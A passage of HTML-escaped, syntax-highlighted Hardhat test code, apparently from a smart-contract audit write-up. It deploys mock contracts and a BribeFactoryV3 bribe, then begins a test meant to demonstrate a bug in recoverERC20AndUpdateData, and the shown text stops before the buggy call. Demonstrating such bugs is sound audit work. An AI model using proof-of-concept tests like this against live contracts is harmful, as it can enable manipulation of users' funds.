class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;MockTokenHandler\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy mock VotingEscrow\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;MockVotingEscrow\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockVe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockVe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy mock Minter\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;MockMinter\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Set up mock Voter to return mock VE\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockVoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetVe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockVe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Set up mock GaugeManager to return minter\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Set initial active period\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetActivePeriod\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003efloor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk10\"\u003eDate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003enow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy BribeFactoryV3 as upgradeable\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBribeFactoryV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;BribeFactoryV3\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eupgrades\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployProxy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBribeFactoryV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, [\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockVoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ], { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitializer:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;initialize\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Create a bribe contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateBribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;test\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceipt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Get the bribe address from the factory\u0026#39;s last_bribe variable\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribeAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elast_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractAt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Bribe\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribeAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Add some tokens to the bribe contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;1000\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribeAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edescribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;recoverERC20AndUpdateData\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Should demonstrate bug in recoverERC20AndUpdateData\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Get initial token rewards per epoch\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eepochStart\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetEpochStart\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etokenRewardsPerEpoch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eepochStart\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Call recoverERC20AndUpdateData through the factory\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan 